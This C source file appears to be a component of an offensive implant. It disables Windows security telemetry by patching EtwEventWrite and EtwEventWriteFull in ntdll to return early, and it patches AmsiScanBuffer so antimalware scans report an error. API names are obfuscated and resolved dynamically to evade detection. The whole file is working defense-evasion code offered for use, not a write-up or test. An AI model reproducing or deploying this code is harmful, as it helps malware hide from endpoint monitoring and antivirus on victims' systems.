/*
 * ETW Patching + AMSI Bypass — all via dynamic API resolution
 */

#include "telemetry.h"
#include "winapi.h"
#include "obfstr.h"

#if ENABLE_ETW_PATCH
BOOL PatchETW(void) {
    char s_ntdll[OBF_NTDLL_LEN];
    deobf(s_ntdll, OBF_NTDLL, OBF_NTDLL_LEN);
    HMODULE ntdll = g_Api.pGetModuleHandleA(s_ntdll);
    SecureZeroMemory(s_ntdll, sizeof(s_ntdll));
    if (!ntdll) return FALSE;

    char s_etw[OBF_ETWWRITE_LEN];
    deobf(s_etw, OBF_ETWWRITE, OBF_ETWWRITE_LEN);
    PVOID pEtwEventWrite = (PVOID)g_Api.pGetProcAddress(ntdll, s_etw);
    SecureZeroMemory(s_etw, sizeof(s_etw));
    if (!pEtwEventWrite) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };

    DWORD old_protect;
    if (!g_Api.pVirtualProtect(pEtwEventWrite, sizeof(patch),
            PAGE_EXECUTE_READWRITE, &old_protect))
        return FALSE;

    memcpy(pEtwEventWrite, patch, sizeof(patch));
    g_Api.pVirtualProtect(pEtwEventWrite, sizeof(patch), old_protect, &old_protect);

    char s_etwfull[OBF_ETWWRITEFULL_LEN];
    deobf(s_etwfull, OBF_ETWWRITEFULL, OBF_ETWWRITEFULL_LEN);
    PVOID pEtwFull = (PVOID)g_Api.pGetProcAddress(ntdll, s_etwfull);
    SecureZeroMemory(s_etwfull, sizeof(s_etwfull));

    if (pEtwFull) {
        if (g_Api.pVirtualProtect(pEtwFull, sizeof(patch),
                PAGE_EXECUTE_READWRITE, &old_protect)) {
            memcpy(pEtwFull, patch, sizeof(patch));
            g_Api.pVirtualProtect(pEtwFull, sizeof(patch), old_protect, &old_protect);
        }
    }

    return TRUE;
}
#else
BOOL PatchETW(void) { return TRUE; }
#endif

#if ENABLE_AMSI_PATCH
BOOL PatchAMSI(void) {
    char s_amsi[OBF_AMSI_LEN];
    deobf(s_amsi, OBF_AMSI, OBF_AMSI_LEN);
    HMODULE amsi = g_Api.pLoadLibraryA(s_amsi);
    SecureZeroMemory(s_amsi, sizeof(s_amsi));
    if (!amsi) return TRUE;

    char s_scan[OBF_AMSISCANBUF_LEN];
    deobf(s_scan, OBF_AMSISCANBUF, OBF_AMSISCANBUF_LEN);
    PVOID pAmsiScanBuffer = (PVOID)g_Api.pGetProcAddress(amsi, s_scan);
    SecureZeroMemory(s_scan, sizeof(s_scan));
    if (!pAmsiScanBuffer) return FALSE;

    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

    DWORD old_protect;
    if (!g_Api.pVirtualProtect(pAmsiScanBuffer, sizeof(patch),
            PAGE_EXECUTE_READWRITE, &old_protect))
        return FALSE;

    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    g_Api.pVirtualProtect(pAmsiScanBuffer, sizeof(patch), old_protect, &old_protect);

    return TRUE;
}
#else
BOOL PatchAMSI(void) { return TRUE; }
#endif
